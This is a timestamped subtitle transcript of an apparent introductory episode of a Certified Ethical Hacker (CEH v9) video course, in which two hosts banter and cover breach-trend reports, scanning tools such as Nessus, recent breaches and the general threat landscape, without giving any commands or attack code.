[LAUGH] >> Anyway, let's talk\na little bit about some of the stuff we're\n\n27\n00:01:08.080 --> 00:01:12.150\ngonna cover here in our intro to\nethical hacking conversations.\n\n28\n00:01:12.150 --> 00:01:14.200\nWe're gonna take a look at some of\nthe background material that you\n\n29\n00:01:14.200 --> 00:01:14.830\nwant to be aware of.\n\n30\n00:01:14.830 --> 00:01:16.850\nWe're gonna define some terms for you.\n\n31\n00:01:16.850 --> 00:01:18.789\nMike is gonna take us on\nlittle field trip, hopefully,\n\n32\n00:01:18.789 --> 00:01:21.880\nyou all have your permission slip signed,\nand partners picked out.\n\n33\n00:01:21.880 --> 00:01:24.790\nWe're gonna be taking a look at some\nresources out on the web that would\n\n34\n00:01:24.790 --> 00:01:27.850\nbe valuable for\nyou as a security professional certainly,\n\n35\n00:01:27.850 --> 00:01:32.300\nand as somebody who ultimately is looking\nto get certified in ethical hacking.\n\n36\n00:01:32.300 --> 00:01:37.470\nWe would want to make sure you're aware of\nresources such as data breach information.\n\n37\n00:01:37.470 --> 00:01:39.870\nWhat's going on out there\nfrom a trend perspective.\n\n38\n00:01:39.870 --> 00:01:42.950\nWhat are the kind of websites we may\nwant to look at to do some research.\n\n39\n00:01:42.950 --> 00:01:46.270\nWhat are some information security\nstandards that we may want to be aware of\n\n40\n00:01:46.270 --> 00:01:49.770\nthat would help us as ethical hackers,\nas security professionals,\n\n41\n00:01:49.770 --> 00:01:52.800\nto be better prepared to counsel\nour clients, our customers, and\n\n42\n00:01:52.800 --> 00:01:55.690\nthose that we are trying to\ndefend as opposed to those\n\n43\n00:01:55.690 --> 00:01:59.020\nthat we're trying to defend against,\nand the information we need to do that.\n\n44\n00:01:59.020 --> 00:02:00.570\nWhat are tools that are gonna be valuable?\n\n45\n00:02:00.570 --> 00:02:03.920\nWe want to build into what I'll\njust generically referr to and\n\n46\n00:02:03.920 --> 00:02:07.780\nwe'll talk a lot about over the time we're\ntogether, as the toolkit that the CEA,\n\n47\n00:02:07.780 --> 00:02:11.140\nthe Certified Ethical Hacker\nwants to ultimately have and\n\n48\n00:02:11.140 --> 00:02:15.250\ncarry with them as they go out into the\nworld and try to take on the bad guys and\n\n49\n00:02:15.250 --> 00:02:17.305\nthe bad girls and\nthe people that are looking to do us harm.\n\n50\n00:02:17.305 --> 00:02:22.320\nYeah we have to be prepared and\nthe ultimate goal of a certified hacker or\n\n51\n00:02:22.320 --> 00:02:26.770\nany security professional, but especially\nsomebody who goes to the time and trouble\n\n52\n00:02:26.770 --> 00:02:30.560\nof learning how to become an ethical\nhacker, seeks to ultimately work through\n\n53\n00:02:30.560 --> 00:02:35.880\nthe material that is out there, go through\nthe exam, the CEH exam with EC council and\n\n54\n00:02:35.880 --> 00:02:40.990\nbecome certified, is to build up knowledge\nbut also to have access to tools.\n\n55\n00:02:40.990 --> 00:02:44.290\nAnd tools becomes very important for\nus, or become very important for\n\n56\n00:02:44.290 --> 00:02:47.430\nus as we think about,\nwhat are the mechanisms, what are methods?\n\n57\n00:02:47.430 --> 00:02:50.490\nWhat are the things that we need\nto do to be better than those\n\n58\n00:02:50.490 --> 00:02:53.330\nthat are hoping to take our information,\nour systems, and\n\n59\n00:02:53.330 --> 00:02:56.850\nthe services that they provide away\nfrom us and also from our customers.\n\n60\n00:02:56.850 --> 00:02:58.650\nAnd so we're gonna focus on\nhow to build that toolkit.\n\n61\n00:02:58.650 --> 00:03:01.600\nWhere do you find these\ntools that we're gonna demo?\n\n62\n00:03:01.600 --> 00:03:04.460\nAll the tools that we're gonna talk about,\nnot without exception, but\n\n63\n00:03:04.460 --> 00:03:06.130\nmajority of them are available free.\n\n64\n00:03:06.130 --> 00:03:10.710\nA lot of them you can simply download and\nuse, some you may need to download, demo,\n\n65\n00:03:10.710 --> 00:03:12.580\nand then if you like, you may need to buy.\n\n66\n00:03:12.580 --> 00:03:15.730\nWe'll talk about that obviously in\nthe sense that, hey here's a website,\n\n67\n00:03:15.730 --> 00:03:19.320\nyou want to go look at Landguard for\ninstance, or you want to go look at\n\n68\n00:03:19.320 --> 00:03:24.470\nTenable or any of these massive\ninformation management and scanning and\n\n69\n00:03:24.470 --> 00:03:27.940\ninformation security systems that\nare available, many cloud enabled today,\n\n70\n00:03:27.940 --> 00:03:31.080\nand you want to use them,\nthere is usually a demo available.\n\n71\n00:03:31.080 --> 00:03:32.480\nNessus is a good example.\n\n72\n00:03:32.480 --> 00:03:36.010\nIt used to be a tool that you could use,\nessentially, locally free of charge.\n\n73\n00:03:36.010 --> 00:03:40.015\nIt was bought several years back,\nthe company is now a major information\n\n74\n00:03:40.015 --> 00:03:43.270\nsecurity product from\nthe enterprise perspective.\n\n75\n00:03:43.270 --> 00:03:44.890\nYou have to go out and sign up for\n\n76\n00:03:44.890 --> 00:03:48.400\na demo at the website to be able to\nuse the product, and if you like it,\n\n77\n00:03:48.400 --> 00:03:51.170\nyou should consider whether or\nnot it make sense for you to use.\n\n78\n00:03:51.170 --> 00:03:54.390\nBut there's always an alternative,\nmeaning there's usually a tool\n\n79\n00:03:54.390 --> 00:03:57.760\nthat you can find that will do most\nif not everything that that tool or\n\n80\n00:03:57.760 --> 00:04:01.160\nany of those tools do,\nwithout necessarily having to spend\n\n81\n00:04:01.160 --> 00:04:03.890\na lot of your organization's\nmoney to get to that place.\n\n82\n00:04:03.890 --> 00:04:07.400\nAnd we'll talk about a lot of tools that\nare available free of charge because I\n\n83\n00:04:07.400 --> 00:04:10.570\nthink it's very important,\nas I've talked about in some of the other\n\n84\n00:04:10.570 --> 00:04:13.050\nepisodes we've done,\nin other subject areas,\n\n85\n00:04:13.050 --> 00:04:16.670\nthat you always have access to tools that\nyou can use, you can spend time with and\n\n86\n00:04:16.670 --> 00:04:20.485\nyou can learn to use effectively but\nnot have to spend a lot of money.\n\n87\n00:04:20.485 --> 00:04:23.045\nSecurity, information\nsecurity in particular,\n\n88\n00:04:23.045 --> 00:04:25.903\nshould be something that\nis available to everybody.\n\n89\n00:04:25.903 --> 00:04:29.625\nI think it's something that ultimately\nshould not be limited by the amount of\n\n90\n00:04:29.625 --> 00:04:33.907\nmoney or the amount of time an institution\ncan or cannot spend to defend themselves.\n\n91\n00:04:33.907 --> 00:04:36.787\nI will take the approach that we\nwanna show you how to do that.\n\n92\n00:04:36.787 --> 00:04:38.317\nAnd how to use a mixture of systems and\n\n93\n00:04:38.317 --> 00:04:40.127\ntools in order to be able\nto accomplish that goal.\n\n94\n00:04:40.127 --> 00:04:41.987\nSo we'll be going to some of these things.\n\n95\n00:04:41.987 --> 00:04:44.683\nWe'll take a look at the elements\nof information security,\n\n96\n00:04:44.683 --> 00:04:47.193\nwe'll talk about security threat and\nattack vectors.\n\n97\n00:04:47.193 --> 00:04:51.033\nWhat are they, how do we define them,\nwhy are they important to be aware of,\n\n98\n00:04:51.033 --> 00:04:53.723\nwhat are some of the things that\nwe should be concerned about.\n\n99\n00:04:53.723 --> 00:04:56.163\nGot a little vocabulary list\nthat we'll talk a look at,\n\n100\n00:04:56.163 --> 00:04:57.517\nhelp you understand some terms.\n\n101\n00:04:57.517 --> 00:05:01.360\nMike may even put up a flash card or\ntwo and he may even dress up and\n\n102\n00:05:01.360 --> 00:05:02.320\ndo some crazy things.\n\n103\n00:05:02.320 --> 00:05:05.520\nI heard tell, I'm not sure, but\nI heard a rumor that he was planning on\n\n104\n00:05:05.520 --> 00:05:10.240\nimpersonating some sort of a security\nsystem and dressing up accordingly.\n\n105\n00:05:10.240 --> 00:05:13.330\nHave you ever seen those commercials for\nGameFly, by the way?\n\n106\n00:05:13.330 --> 00:05:14.760\n>> Yes.\n>> The postal guy keeps\n\n107\n00:05:14.760 --> 00:05:15.540\ndelivering the games.\n\n108\n00:05:15.540 --> 00:05:16.535\n>> Yeah.\n>> The guy or the kid,\n\n109\n00:05:16.535 --> 00:05:20.070\nlike a few different ones, the guy comes\nout dressed like the character every time.\n\n110\n00:05:20.070 --> 00:05:22.600\nAnd at the end of the one with\nthe older guy that is there,\n\n111\n00:05:22.600 --> 00:05:27.200\nhe is dressed up as like the piece from,\nwhat's that game?\n\n112\n00:05:28.705 --> 00:05:29.731\n[CROSSTALK] Tetris.\n\n113\n00:05:29.731 --> 00:05:30.715\n>> Yes, yes.\n[CROSSTALK]\n\n114\n00:05:30.715 --> 00:05:32.530\n>> And the guy's says, old school.\n\n115\n00:05:32.530 --> 00:05:34.845\nAnd the guy's like all dressed up,\nin the thing with the.\n\n116\n00:05:34.845 --> 00:05:35.790\n>> [LAUGH]\n>> And he looks like a piece\n\n117\n00:05:35.790 --> 00:05:36.470\nout of the rubics cube.\n\n118\n00:05:36.470 --> 00:05:37.100\n>> Right.\n>> It's really funny.\n\n119\n00:05:37.100 --> 00:05:39.760\nWe're digressing, we'll get back\nto what we're here to talk about.\n\n120\n00:05:39.760 --> 00:05:41.790\nAnyway, we'll take a look\nat all of this and more.\n\n121\n00:05:41.790 --> 00:05:45.610\nAnd we're gonna start in by talking about\nsome of the things that are going on out\n\n122\n00:05:45.610 --> 00:05:48.520\nthere today\u007f, and today being\na relative thing, obviously, yet\n\n123\n00:05:48.520 --> 00:05:52.820\nwe put content together for you, we spend\ntime in the studio putting it together.\n\n124\n00:05:52.820 --> 00:05:55.460\nIt's fresh and\navailable at that moment in time.\n\n125\n00:05:55.460 --> 00:05:58.980\nSome of the things like the hacking\ntrends we're gonna talk about right now,\n\n126\n00:05:58.980 --> 00:06:00.330\nare of course contextual, right?\n\n127\n00:06:00.330 --> 00:06:02.670\nThey're important right now,\nat this moment in time.\n\n128\n00:06:02.670 --> 00:06:04.760\nIf you're watching this\nepisode six months or\n\n129\n00:06:04.760 --> 00:06:07.440\na year after we put it together,\nthey're still important.\n\n130\n00:06:07.440 --> 00:06:11.650\nThey're still very telling for\nyou with regards to trends but\n\n131\n00:06:11.650 --> 00:06:12.780\nthey may not be as up to date.\n\n132\n00:06:12.780 --> 00:06:16.180\nThey may not be as accurate as some of\nthe stuff we talk about at the moment,\n\n133\n00:06:16.180 --> 00:06:17.160\nthat we're talking about it now.\n\n134\n00:06:17.160 --> 00:06:21.210\nSo keep in mind that we're gonna show you\nsome websites, talk about places to find\n\n135\n00:06:21.210 --> 00:06:24.830\nthings, we always encourage you to go\nout and find the latest information.\n\n136\n00:06:24.830 --> 00:06:27.210\nJust make sure you update\nthat thought process.\n\n137\n00:06:27.210 --> 00:06:29.450\nIf there's a new report,\ntake a look at it.\n\n138\n00:06:29.450 --> 00:06:32.510\nIf there's a new information\nitem on that trend list,\n\n139\n00:06:32.510 --> 00:06:33.840\nmake sure you're aware of that.\n\n140\n00:06:33.840 --> 00:06:35.850\nThat's the most important take\naway from the conversation.\n\n141\n00:06:35.850 --> 00:06:37.770\nSo, if we can go to Mike's machine for\na minute,\n\n142\n00:06:37.770 --> 00:06:41.620\nwe have a couple of websites slash\nreports we just want to show you.\n\n143\n00:06:41.620 --> 00:06:43.810\nWhen we think about becoming\na Certified Ethical Hacker,\n\n144\n00:06:43.810 --> 00:06:47.290\none of the first thing we have to think\nabout is awareness of the trends that\n\n145\n00:06:47.290 --> 00:06:51.190\nare going on in the industry today and\nmore broadly, just in the world today.\n\n146\n00:06:51.190 --> 00:06:53.600\nMike and I were taking about this\nright before we came online today,\n\n147\n00:06:53.600 --> 00:06:55.120\nto do this episode with you.\n\n148\n00:06:55.120 --> 00:06:57.660\nThe fact that, everything is so\ninterconnected.\n\n149\n00:06:57.660 --> 00:07:01.270\nI was mentioning to Mike that I had\na student in one of my classes that was\n\n150\n00:07:01.270 --> 00:07:04.680\nattending from very far away,\nin Africa of all places,\n\n151\n00:07:04.680 --> 00:07:08.600\nshe was attending one of my online\nclasses and was not always there.\n\n152\n00:07:08.600 --> 00:07:11.990\nAnd I didn't realise at the time,\nthat she wasn't actually in the US.\n\n153\n00:07:11.990 --> 00:07:14.540\nAnd after the class she got in touch\nwith me and said hey, I was successful,\n\n154\n00:07:14.540 --> 00:07:19.450\njust wanted to thank you and by the way,\nI live in this country in Africa and\n\n155\n00:07:19.450 --> 00:07:23.200\nas a result, I'm not able to attend\nnormally and the videos, the recordings\n\n156\n00:07:23.200 --> 00:07:25.850\nwere very helpful and I just wanted to\nthank you for all that information.\n\n157\n00:07:25.850 --> 00:07:28.890\nAnd you know it's really a very\ndifferent world than it was five,\n\n158\n00:07:28.890 --> 00:07:32.490\neven ten years ago with the advent\nof the cloud and things like that.\n\n159\n00:07:32.490 --> 00:07:35.514\nThese trend reports that we're gonna\npoint out to you are very helpful for\n\n160\n00:07:35.514 --> 00:07:38.074\nthe average security professional\nbecause they aggregate.\n\n161\n00:07:38.074 --> 00:07:42.343\nThey bring together a lot of data that is\ngonna be important for us to be aware of,\n\n162\n00:07:42.343 --> 00:07:46.678\nbut as a security professional practising\nin the United States as I am, as many of\n\n163\n00:07:46.678 --> 00:07:51.012\nyou may be, you may not understand what's\ngoing on in Eastern Europe or in Asia or\n\n164\n00:07:51.012 --> 00:07:55.219\nin Africa or in Latin America with the\nkind of things that are in these reports,\n\n165\n00:07:55.219 --> 00:07:58.603\nbecause you may only see your\nlittle slice of the world today.\n\n166\n00:07:58.603 --> 00:08:01.270\nUnless you work for\na company that is global in scope,\n\n167\n00:08:01.270 --> 00:08:05.422\nthat has organizational infrastructure\nin various countries, you may not really\n\n168\n00:08:05.422 --> 00:08:09.170\nknow what's going on in the world,\nthere or localized in that area.\n\n169\n00:08:09.170 --> 00:08:12.790\nSo reports like, I think this is\nthe IBM cloud data study, right?\n\n170\n00:08:12.790 --> 00:08:13.320\n>> Yes sir.\n\n171\n00:08:13.320 --> 00:08:14.930\n>> The cost of data breach study rather.\n\n172\n00:08:14.930 --> 00:08:18.710\nSo you know you can go out to websites,\nand I know Mike cuz we always will,\n\n173\n00:08:18.710 --> 00:08:19.790\nor always do, rather.\n\n174\n00:08:19.790 --> 00:08:22.910\nWill put the URLs for\nthese particular reports up.\n\n175\n00:08:22.910 --> 00:08:25.420\nBut all we did to find them\nwas simply go to google and\n\n176\n00:08:25.420 --> 00:08:30.470\ndo a search for data breach 2016 or\ndata breach information.\n\n177\n00:08:30.470 --> 00:08:34.650\nAnd you'll get a list of the top five or\nten reports that are available.\n\n178\n00:08:34.650 --> 00:08:38.070\nIBM is on that list,\nthe Ponemon Institute is on that list.\n\n179\n00:08:38.070 --> 00:08:41.919\nI know I believe we have\nthe Verizon DBIR report there,\n\n180\n00:08:41.919 --> 00:08:44.774\nthe one from Blue Coat is there, right?\n\n181\n00:08:44.774 --> 00:08:47.788\nSo there's a lot of different reports that\nyou can take a look at as Mike's just kind\n\n182\n00:08:47.788 --> 00:08:49.520\nof jumping around and showing you.\n\n183\n00:08:49.520 --> 00:08:52.760\nAnd any one of these, as you can see,\nwill be valuable for you.\n\n184\n00:08:52.760 --> 00:08:55.800\nA lot of them you have to just\ngive your registration information\n\n185\n00:08:55.800 --> 00:08:57.550\nbefore you can download the report.\n\n186\n00:08:57.550 --> 00:08:59.380\nNone of them cost money, just to be clear,\n\n187\n00:08:59.380 --> 00:09:01.750\nthey're free,\nyou just have to register to see them.\n\n188\n00:09:01.750 --> 00:09:03.960\nBut you should take a look at one or\nmore of them.\n\n189\n00:09:03.960 --> 00:09:05.050\nCouple of reasons for that.\n\n190\n00:09:05.050 --> 00:09:08.930\nNumber one as a CEH candidate,\nas somebody that wants to become\n\n191\n00:09:08.930 --> 00:09:11.650\ncertified in Ethical Hacking,\nit's very important for\n\n192\n00:09:11.650 --> 00:09:15.440\nyou to understand what's going on in\nthe world with regards to the trends.\n\n193\n00:09:15.440 --> 00:09:18.270\nSo you understand the kind of hacking\nincidents that may be occurring.\n\n194\n00:09:18.270 --> 00:09:21.636\nYou have a better understand of what you\nmay be up against in terms of having to\n\n195\n00:09:21.636 --> 00:09:26.070\ndefend but also what you may have to\nthink about doing to penetration test,\n\n196\n00:09:26.070 --> 00:09:30.530\nvulnerability assess in order to\nmake sure that you can essentially\n\n197\n00:09:30.530 --> 00:09:34.550\nunderstand the liability, the impact,\nthe exposure that your company has or\n\n198\n00:09:34.550 --> 00:09:39.610\nwhatever company you happen to be working\nfor has and as a result mange risk.\n\n199\n00:09:39.610 --> 00:09:42.320\nAnd almost everything we talk\nabout in this episode and\n\n200\n00:09:42.320 --> 00:09:45.940\nany episode throughout the entire body of\nwork we're gonna put together around this\n\n201\n00:09:45.940 --> 00:09:50.560\ntopic for CEH version nine is first and\nforemost focused on managing risks,\n\n202\n00:09:50.560 --> 00:09:55.090\nunderstanding how to mitigate or\nmanage risks down in the organization.\n\n203\n00:09:55.090 --> 00:09:58.420\nIt's so critical today that we're\nable to do that and really the goal,\n\n204\n00:09:58.420 --> 00:10:02.320\nthe primary goal, of being a CEH,\nbeing a Certified Ethical Hacker,\n\n205\n00:10:02.320 --> 00:10:06.300\nis to understand how to take on\nthose risks, turn them around and\n\n206\n00:10:06.300 --> 00:10:09.790\nthen defend against them within the\norganization through the application of\n\n207\n00:10:09.790 --> 00:10:14.200\nbest practices, through the application\nof policy, process, procedure,\n\n208\n00:10:14.200 --> 00:10:18.390\nto implement a standard and then to\nmanage it down through the organization.\n\n209\n00:10:18.390 --> 00:10:21.990\nAnd then to use tools, techniques,\nand technology to be able to,\n\n210\n00:10:21.990 --> 00:10:23.852\nthat was a triple t by the way,\nin case you didn't pick that up.\n\n211\n00:10:23.852 --> 00:10:24.426\n>> [LAUGH] I saw that.\n\n212\n00:10:24.426 --> 00:10:27.453\n>> In order to be able to\napply that information.\n\n213\n00:10:27.453 --> 00:10:30.990\nWe look at what's going on\nin the hacker community.\n\n214\n00:10:30.990 --> 00:10:32.170\nWe learn, in other words,\n\n215\n00:10:32.170 --> 00:10:35.350\nfrom those events and\nthen we try to take that information.\n\n216\n00:10:35.350 --> 00:10:39.490\nTurn it around in some way\nto be able to make that into\n\n217\n00:10:39.490 --> 00:10:43.960\ninformation that we can use from the\ndefensive perspective to, as a result, go\n\n218\n00:10:43.960 --> 00:10:47.990\non the offensive if you will and be able\nto apply that knowledge proactively to our\n\n219\n00:10:47.990 --> 00:10:51.730\nnetworks to ensure we're not falling\npray to these kinds of circumstances.\n\n220\n00:10:51.730 --> 00:10:54.830\nDoesn't work, by the way,\nin every case, right, and\n\n221\n00:10:54.830 --> 00:10:57.210\nI wanna be clear, a lot of\nthe techniques we'll talk about here,\n\n222\n00:10:57.210 --> 00:11:01.750\na lot of the things that we're gonna do\nhere will, primarily, if done correctly,\n\n223\n00:11:01.750 --> 00:11:06.340\nhelp you to be more effective at applying\nsecurity and best practices and.\n\n224\n00:11:06.340 --> 00:11:09.870\nSomething, a lot of times people\nsay can I hackproof my network?\n\n225\n00:11:09.870 --> 00:11:11.500\nI don't think you can hackproof anything.\n\n226\n00:11:11.500 --> 00:11:16.050\nI think you can take steps to minimize\nthe potential opportunity for\n\n227\n00:11:16.050 --> 00:11:19.210\nsomebody to break into your system or\nnetwork or\n\n228\n00:11:19.210 --> 00:11:23.370\nwhatever it may be, if you are willing\nto go to that time and trouble.\n\n229\n00:11:23.370 --> 00:11:26.740\nBut unless you maintain that effort,\nunless you are vigilant,\n\n230\n00:11:26.740 --> 00:11:30.740\nunless you constantly assess where you\nare, read up, as we were talking about,\n\n231\n00:11:30.740 --> 00:11:33.430\non certain trends and\nunderstand how to apply that knowledge,\n\n232\n00:11:33.430 --> 00:11:36.980\nit becomes very difficult for you to say,\nwe were just talking about this\n\n233\n00:11:36.980 --> 00:11:39.580\nbefore we came online as well,\nhey, I've got this content.\n\n234\n00:11:39.580 --> 00:11:41.985\nI'm gonna put it out there, and\nit's gonna be good forever.\n\n235\n00:11:41.985 --> 00:11:42.610\n>> [LAUGH]\n>> No.\n\n236\n00:11:42.610 --> 00:11:43.750\nYou've got this content,\n\n237\n00:11:43.750 --> 00:11:47.010\nin this case this knowledge, you're going\nto apply it to your systems, whatever\n\n238\n00:11:47.010 --> 00:11:50.910\nthe particular skill we're talking about\nmay be, and it's good for right now.\n\n239\n00:11:50.910 --> 00:11:52.660\nAnd it may be good for a long time.\n\n240\n00:11:52.660 --> 00:11:54.770\nCertain things don't change.\n\n241\n00:11:54.770 --> 00:11:59.310\nIPv4, as an example, has been\nthe same since somebody came up with\n\n242\n00:11:59.310 --> 00:12:03.870\nthe original RFC for\nIP back in the late 1970s, right?\n\n243\n00:12:03.870 --> 00:12:05.850\nAnd that thought process has not changed.\n\n244\n00:12:05.850 --> 00:12:07.870\nIt's always been a 32-bit address,\n\n245\n00:12:07.870 --> 00:12:10.830\nit's always gotten perhaps\ncertain rules applied with it.\n\n246\n00:12:10.830 --> 00:12:14.892\nEven in the face of IPv6,\nIPv4 is still the same.\n\n247\n00:12:14.892 --> 00:12:18.713\nSo, knowledge of that basic concept\nof the understanding of networking,\n\n248\n00:12:18.713 --> 00:12:22.730\nin other words, has basically been\nstatic for 30, 40 some odd years now.\n\n249\n00:12:22.730 --> 00:12:26.643\nBut what we do with it and the depth\nwe go to understand packet crafting,\n\n250\n00:12:26.643 --> 00:12:31.211\npacket manipulation, fragmentation,\nbeing able to test using certain flags and\n\n251\n00:12:31.211 --> 00:12:33.952\nsetting them or\nturning them off to see the results\n\n252\n00:12:33.952 --> 00:12:38.390\nof that from a scan against the machine to\nunderstand what operating system may or\n\n253\n00:12:38.390 --> 00:12:41.948\nmay not be there what we call\noperating system fingerprinting.\n\n254\n00:12:41.948 --> 00:12:45.329\nAnd we'll take a look that and\ntalk about that in upcoming episodes.\n\n255\n00:12:45.329 --> 00:12:48.830\nThat knowledge is very important and\nsome of it's static.\n\n256\n00:12:49.950 --> 00:12:54.170\nA TCP scan hasn't really changed all\nthat much in the last 30 or 40 years.\n\n257\n00:12:54.170 --> 00:12:55.950\nA SYN scan hasn't really changed.\n\n258\n00:12:55.950 --> 00:12:56.480\nAn Xmas scan.\n\n259\n00:12:56.480 --> 00:12:58.475\nIt's still pretty much an Xmas scan.\n\n260\n00:12:58.475 --> 00:13:00.415\nTurn everything on, see what happens.\n\n261\n00:13:00.415 --> 00:13:04.745\nBut the reality is what does change is\nthe behavior of the targeted system and\n\n262\n00:13:04.745 --> 00:13:07.695\nwhat it tells us with\nregards to that information.\n\n263\n00:13:07.695 --> 00:13:11.422\nAnd if we don't keep up on that and\nkeep up that knowledge fresh over time,\n\n264\n00:13:11.422 --> 00:13:13.512\nit's gonna be very important for\nus to understand for\n\n265\n00:13:13.512 --> 00:13:17.622\nyou to understand that if you don't do\nthat, the knowledge becomes perishable,\n\n266\n00:13:17.622 --> 00:13:21.322\nit'll become stale and essentially,\nyou're caught in a vacuum.\n\n267\n00:13:21.322 --> 00:13:25.260\nAnd if you're not able to refresh that\nknowledge, the protections you're applying\n\n268\n00:13:25.260 --> 00:13:28.710\nbecome less and less relevant to the\nsystems that you are defending over time.\n\n269\n00:13:28.710 --> 00:13:30.070\nSo we just wanted to think about that,\n\n270\n00:13:30.070 --> 00:13:32.460\njust want to make sure that\nwe're comfortable with that.\n\n271\n00:13:32.460 --> 00:13:36.400\nWe have a sense of that, and of course,\nwe think about some of the recent breaches\n\n272\n00:13:36.400 --> 00:13:38.680\nthat have occurred, and\nagain recent is relative.\n\n273\n00:13:38.680 --> 00:13:42.370\nBut in the last couple of years, right, if\nyou think about some of the major breaches\n\n274\n00:13:42.370 --> 00:13:47.770\nthat have gone on, you can think about\nthe Home Depot breach that occurred.\n\n275\n00:13:47.770 --> 00:13:50.090\nYou can think about the Target\nbreach in the United States.\n\n276\n00:13:50.090 --> 00:13:52.240\nYou can think about JP Morgan Chase.\n\n277\n00:13:52.240 --> 00:13:54.140\nYou can think about Apple and iCloud.\n\n278\n00:13:54.140 --> 00:13:59.150\nAll this happened in 2014, 2015,\nand 2016, over the last few years.\n\n279\n00:13:59.150 --> 00:14:01.960\nYou can think about some\nof the more recent ones.\n\n280\n00:14:01.960 --> 00:14:05.570\nTwitter was just hacked in the last\nweek or so, right, and they had a major,\n\n281\n00:14:05.570 --> 00:14:06.620\nmajor issue.\n\n282\n00:14:06.620 --> 00:14:08.480\nAnd so we want to think about that and\n\n283\n00:14:08.480 --> 00:14:10.840\nbe aware of the fact that\nthis is an ongoing issue.\n\n284\n00:14:10.840 --> 00:14:12.640\nThis is not something that goes away.\n\n285\n00:14:12.640 --> 00:14:15.850\nNot something that changes\njust once in awhile.\n\n286\n00:14:15.850 --> 00:14:17.430\nThis is changing constantly.\n\n287\n00:14:17.430 --> 00:14:18.830\nThe threat landscape is evolving.\n\n288\n00:14:18.830 --> 00:14:21.240\nOne of the very interesting\ntrends we're seeing more and\n\n289\n00:14:21.240 --> 00:14:25.360\nmore in the industry is that a lot of\nthe attacks that we thought traditionally\n\n290\n00:14:25.360 --> 00:14:30.030\nhad kind of gone away and had been dealt\nwith from a variety of perspectives\n\n291\n00:14:30.030 --> 00:14:33.180\nbecause of the march of technology\nhave been coming back again.\n\n292\n00:14:33.180 --> 00:14:37.360\nAnd we're seeing a lot of old school,\nright, attacks coming back and\n\n293\n00:14:37.360 --> 00:14:41.920\nbecoming more relevant in the hacking\ncommunity because, number 1, we think, and\n\n294\n00:14:41.920 --> 00:14:45.310\nI think the analysis bears out the fact,\nthat a lot of the security professionals\n\n295\n00:14:45.310 --> 00:14:48.980\nthat remember how to deal with these\nthings are just not practicing any more.\n\n296\n00:14:48.980 --> 00:14:52.230\nAnd so, unfortunately a lot of that\nknowledge has left our community.\n\n297\n00:14:52.230 --> 00:14:56.369\nNumber 2, low and slow attacks,\nwhich is what we often refer to them as.\n\n298\n00:14:57.450 --> 00:15:01.230\nFragmentation attacks, for instance,\nand attacks that allows us to propagate\n\n299\n00:15:01.230 --> 00:15:05.110\nattack vectors and attack packets through\na system in such a way that they're very\n\n300\n00:15:05.110 --> 00:15:08.290\ndifficult to scan for, have really never\ngone away, but they're becoming more\n\n301\n00:15:08.290 --> 00:15:12.540\nprevalent again, and the problem is our\ntechnology has not always been updated, so\n\n302\n00:15:12.540 --> 00:15:16.560\nour firewalls, our IDSs,\nour IPSs, our IDPSs, right?\n\n303\n00:15:16.560 --> 00:15:20.670\nAll the gateway systems we use have\nreally never been redesigned or\n\n304\n00:15:20.670 --> 00:15:23.770\ndesigned from the ground up to\npick up this kind of traffic.\n\n305\n00:15:23.770 --> 00:15:26.660\nWe just ignored it for a while,\nit stopped being relevant.\n\n306\n00:15:26.660 --> 00:15:31.420\nWe focused on other technology,\nother ways of attaching to attack packets.\n\n307\n00:15:31.420 --> 00:15:33.900\nBut now attackers have come\nfull circle and realized,\n\n308\n00:15:33.900 --> 00:15:36.310\nhey just cuz it's old it\ndoesn't mean it doesn't work.\n\n309\n00:15:36.310 --> 00:15:38.710\nA matter of fact,\nit actually works really well.\n\n310\n00:15:38.710 --> 00:15:41.724\nAnd we're seeing an uptick in this\nkind of attack vector or, in general,\n\n311\n00:15:41.724 --> 00:15:43.192\nthese attack vectors in the cloud.\n\n312\n00:15:43.192 --> 00:15:45.952\nAnd you will talk about\nthe relevance of the cloud with\n\n313\n00:15:45.952 --> 00:15:49.709\nregards to Certified Ethical Hacking\nin some of our upcoming episodes.\n\n314\n00:15:49.709 --> 00:15:51.061\nWe'll have a lot to say about the cloud.\n\n315\n00:15:51.061 --> 00:15:54.947\nCan't really talk about hacking these\ndays without talking about the cloud And\n\n316\n00:15:54.947 --> 00:15:58.899\nvirtualization and those technologies and\nhow they interrelate to each other.\n\n317\n00:15:58.899 --> 00:16:02.660\nYou can't really do cloud computing today\nin a way that we define it formally\n\n318\n00:16:02.660 --> 00:16:04.780\nwithout the use of virtualization.\n\n319\n00:16:04.780 --> 00:16:06.730\nYou can certainly virtualize\nwithout the cloud but\n\n320\n00:16:06.730 --> 00:16:09.290\nit's very hard to do the cloud\nwithout virtualization.\n\n321\n00:16:09.290 --> 00:16:13.180\nSo those two are really linked together\nand the cloud has really enabled and\n\n322\n00:16:13.180 --> 00:16:14.500\nchanged the way.\n\n323\n00:16:14.500 --> 00:16:17.880\nWe talk about productivity,\nwe talk about information sharing,\n\n324\n00:16:17.880 --> 00:16:20.950\nwe talk about collaboration and\nall those kind of things and\n\n325\n00:16:20.950 --> 00:16:24.770\nalso how we talk about an InVision\nsecurity, web enabling or\n\n326\n00:16:24.770 --> 00:16:28.750\ncloud enabling a computer intrerface or\na front-end interface.\n\n327\n00:16:28.750 --> 00:16:32.790\nOr network today means that we\nare turning on capabilities\n\n328\n00:16:32.790 --> 00:16:35.640\nthat give us great flexibility\nwith regards to management.\n\n329\n00:16:35.640 --> 00:16:39.520\nBut also open a tremendous amount of or\nat least potentially open up\n\n330\n00:16:39.520 --> 00:16:44.040\na tremendous amount of opportunity for\nthe hackers, the bad actors out here to\n\n331\n00:16:44.040 --> 00:16:47.770\ncome knock on that door and seek entry and\nwe'll show you through some of the labs\n\n332\n00:16:47.770 --> 00:16:51.650\nwe'll do the hands on exercises the demos\nwhatever you wish to call them.\n\n333\n00:16:51.650 --> 00:16:55.640\nWe'll show you through some of\nthe tools we will use that all you need\n\n334\n00:16:55.640 --> 00:16:58.610\nis an internet connection or\na network connection and\n\n335\n00:16:58.610 --> 00:17:00.270\nthe right kind of information.\n\n336\n00:17:00.270 --> 00:17:03.050\nEssentially maybe a user name,\nmaybe user name and a password,\n\n337\n00:17:03.050 --> 00:17:06.900\nmaybe not even that, if we're on the\ninternal network and combined to a machine\n\n338\n00:17:06.900 --> 00:17:10.190\nin order to manipulate that\nmachine to do a variety of things.\n\n339\n00:17:10.190 --> 00:17:14.480\nIt will hopefully make you much more aware\nof the kind of challenges you face and\n\n340\n00:17:14.480 --> 00:17:17.550\nalso be very illustrative hopefully\nthe kind of things that you can do\n\n341\n00:17:17.550 --> 00:17:20.200\nprovided you're willing to spend\nthe time and understand how to do 